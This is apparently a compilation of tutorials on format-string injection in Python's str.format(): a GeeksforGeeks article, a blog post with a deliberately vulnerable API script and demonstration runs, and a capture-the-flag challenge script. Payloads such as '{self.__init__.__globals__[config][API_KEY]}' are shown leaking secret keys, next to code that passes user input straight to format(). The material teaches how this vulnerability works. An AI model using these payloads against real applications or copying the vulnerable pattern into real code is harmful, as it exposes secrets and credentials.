Vulnerability in str.format() in Python

##
#
https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/#
#
##



Prerequisites: Python – format() function

str.format() is one of the string formatting methods in Python3, which allows multiple substitutions and value formatting. This method lets us concatenate elements within a string through positional formatting. It seems quite a cool thing. But the vulnerability comes when our Python app uses str.format in the user-controlled string. This vulnerability may lead attackers to get access to sensitive information.

Note: This issue has been reported here
str format vulnerability

So how come this becomes a vulnerability. Let’s see the following example

Example:
```
# Let us assume this CONFIG holds some sensitive information
CONFIG = {
    "KEY": "ASXFYFGK78989"
}
  
class PeopleInfo:
    def __init__(self, fname, lname):
        self.fname = fname
        self.lname = lname
  
def get_name_for_avatar(avatar_str, people_obj):
    return avatar_str.format(people_obj = people_obj)
  
  
# Driver Code
people = PeopleInfo('GEEKS', 'FORGEEKS')
  
# case 1: st obtained from user
st = input()
get_name_for_avatar(st, people_obj = people)

```

Case 1:
when user gives the following str as input

Avatar_{people_obj.fname}_{people_obj.lname}
Output:

Avatar_GEEKS_FORGEEKS
Case 2:
when user inputs the following str as input
```
{people_obj.__init__.__globals__[CONFIG][KEY]}
```

Output:
```
ASXFYFGK78989
```

This is because string formatting functions could access attributes objects as well which could leak data. Now a question might arise. Is it bad to use str.format()?. No, but it becomes vulnerable when it is used over user-controlled strings.

Last Updated : 08 Jun, 2020





##
##

Python format string vulnerabilities
 March 24, 2021  3-minute read
 research • poc
 python • format • string • exploit
Table of contents :
What are Python’s format strings
Example of a vulnerable API
Exploiting format strings
Additional references
What are Python’s format strings
The .format() string method was introduced in Python 3 was later also added to Python 2.7. Let’s see an example :

>>> print("I like {} and {}".format("Python","Pizza"))
"I like Python and Pizza"
Even though python format strings can be very useful in scripts, they should be used with caution as they can be prone to vulnerabilities. We will explore this more in depth in the Exploiting format strings part.

Example of a vulnerable API
Here is an example of an API where a user can render user data to HTML using it’s own template and format strings :

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

config = {
    'API_KEY' : "212817d980b9a03add91e5814d02"
}

class API(object):
    def __init__(self, apikey):
        self.apikey = apikey

    def renderHTML(self, templateHTML, title, text):
        return (templateHTML.format(title=title, text=text))

if __name__ == '__main__':
    a = API(config[API_KEY])

    templateHTML = """<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">
        <title>{title}</title>
    </head>
    <body>
        <p>{text}</p>
    </body>
</html>"""

    text = "This is text !"
    print(a.renderHTML(templateHTML, "Vuln web render App", text))
( Download source )

When the user uses this API to render data to HTML with legitimate templates, it would create this :

<html lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">
        <title>Vuln web render App</title>
    </head>
    <body>
        <p>This is text !</p>
    </body>
</html>
But what would happen if a malicious user wants to mess up with the format string placeholders inside the template ? We’ll see this in the next section.

Exploiting format strings
We will try to inject payloads int format string placeholders of the template. I made a simple script taking arguments and executing API’s render function :

Usage :

$ ./sandbox.py
Usage : python3 ./sandbox.py TEMPLATE CONTENT
Source code :

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys

config = {
    'API_KEY' : "212817d980b9a03add91e5814d02"
}

class API(object):
    def __init__(self, apikey):
        self.apikey = apikey

    def renderHTML(self, templateHTML, title, text):
        return (templateHTML.format(self=self, title=title, text=text))


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage : python3 "+sys.argv[0]+" TEMPLATE CONTENT")
    else :
        a = API(config['API_KEY'])
        print(a.renderHTML(sys.argv[1], "Vuln web render App", sys.argv[2]))
( Download source )
```
Let’s try this app with a legitimate example :

$ ./test.py "<p>{text}</p>" "Wow such string"
<p>Wow such string</p>
But format string are great in python ! You can access object properties directly in the format string. In the case of a class, this can be really useful to access a specific value in the class. For example the format string {person.username} would retreive the field username of the following “Person” class :

```
class Person(object):
    def __init__(self, username):
        super(Person, self).__init__()
        self.username = username
```

In our case, we can exploit this to access other attributes, such as __init__ :

$ ./sandbox.py "<p>{text.__init__}</p>" "Wow such string"
<p><method-wrapper '__init__' of str object at 0x7f8f10a3b9f0></p>
 
But we can also use this to get the script global context, using __globals__ after __init__ :
 
```
$ ./sandbox.py "<p>{self.__init__.__globals__}</p>" "Wow such string"
<p>{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f1385ac5f40>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': './sandbox.py', '__cached__': None, 'sys': <module 'sys' (built-in)>, 'config': {'API_KEY': '212817d980b9a03add91e5814d02'}, 'API': <class '__main__.API'>, 'a': <__main__.API object at 0x7f1385b31490>}</p>
 ```
 
 
Continuing like this we can access the API_KEY :

$ ./sandbox.py "<p>{self.__init__.__globals__[config][API_KEY]}</p>" "Wow such string"
<p>212817d980b9a03add91e5814d02</p
Additional references
https://docs.python.org/3/library/functions.html#format
Lots of python format string examples : https://pyformat.info/
 
########
 
 CHAL
 
~~~ 
#!/usr/bin/env python3
import secrets
import sys

SECRET = secrets.token_hex()

class Sandbox:

    def ask_age(self):
        self.age = input("How old are you ? ")
        self.width = input("How wide do you want the nice box to be ? ")

    def ask_secret(self):
        if input("What is the secret ? ") == SECRET:
            print("You found the secret ! I thought this was impossible.")
            sys.exit(0)
        else:
            print("Wrong secret")

    def run(self):
        for _ in range(100):
            self.ask_age()
            to_format = f"""
Printing a {self.width}-character wide box:
[Age: {{self.age:{self.width}}} ]"""
            print(to_format.format(self=self))
            self.ask_secret()
        sys.exit(1)

Sandbox().run()
```
